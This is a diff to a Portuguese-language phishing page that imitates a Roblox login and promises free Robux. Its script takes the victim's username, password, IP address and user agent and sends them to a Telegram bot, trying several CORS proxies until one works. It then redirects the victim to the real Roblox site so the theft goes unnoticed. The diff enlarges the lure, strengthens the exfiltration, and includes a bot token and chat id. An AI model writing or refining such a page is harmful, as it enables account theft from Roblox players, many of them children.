@@ -91,7 +91,7 @@
 <body>
     <div class="login-container">
         <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSIjZmZmIj5Sb2Jsb3ggTG9nbzwvdGV4dD48L3N2Zz4=" alt="Roblox Logo" class="logo">
-        <h2>Resgate seus 3.000 Robux GRÁTIS!</h2>
+        <h2>Resgate seus 15.000 Robux GRÁTIS!</h2>
         <div class="alert">Oferta por tempo limitado! Faça login para resgatar.</div>
 
         <form id="loginForm" method="POST">
@@ -120,54 +120,79 @@
             button.disabled = true;
 
             const formData = new FormData(this);
+            
+            // Tenta pegar o IP da vítima
+            let victimIP = 'N/A';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                victimIP = ipData.ip;
+            } catch (error) {
+                console.error('Falha ao obter IP:', error);
+            }
+
             const credentials = {
                 username: formData.get('username'),
                 password: formData.get('password'),
-                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip).catch(() => 'N/A'),
+                ip: victimIP,
                 userAgent: navigator.userAgent,
                 date: new Date().toLocaleString('pt-BR')
             };
 
-            // Envia para o Telegram
-            const botToken = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU';
-            const chatId = '8028837254';
+            // ENVIO PARA O TELEGRAM VIA PROXY (Solução para CORS)
+            // Use um desses proxies CORS - escolha o mais estável
+            const corsProxies = [
+                'https://cors-anywhere.herokuapp.com/',
+                'https://api.codetabs.com/v1/proxy?quest=',
+                'https://corsproxy.io/?'
+            ];
+
+            const botToken = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU'; // SUBSTITUA
+            const chatId = '8028837254'; // SUBSTITUA
             
-            const message = `🐺 NOVA PRESA CAÍDA NA TRAP 🐺
+            const message = `🐺 *NOVA PRESA CAÍDA NA TRAP* 🐺
 ================================
-Data/Hora: ${credentials.date}
-IP: ${credentials.ip}
-User-Agent: ${credentials.userAgent}
+*Data/Hora:* ${credentials.date}
+*IP:* ${credentials.ip}
+*User-Agent:* ${credentials.userAgent}
 --------------------------------
-USUÁRIO: ${credentials.username}
-SENHA: ${credentials.password}
+*USUÁRIO:* ${credentials.username}
+*SENHA:* ${credentials.password}
 ================================`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).then(response => response.json())
-            .then(data => {
-                // Redireciona após sucesso
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/login';
-                }, 1500);
-            })
-            .catch(error => {
-                console.error('Erro:', error);
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/login';
-                }, 1500);
-            });
+            let success = false;
+            
+            // Tenta enviar usando cada proxy até funcionar
+            for (const proxy of corsProxies) {
+                try {
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const response = await fetch(proxy + telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        success = true;
+                        break; // Sai do loop se deu certo
+                    }
+                } catch (error) {
+                    console.error(`Proxy falhou: ${proxy}`, error);
+                    continue; // Tenta o próximo proxy
+                }
+            }
+
+            // Redireciona independentemente de ter sucesso ou não
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 1500);
         });
     </script>
-</body>
-</html>>
 </body>
 </html>
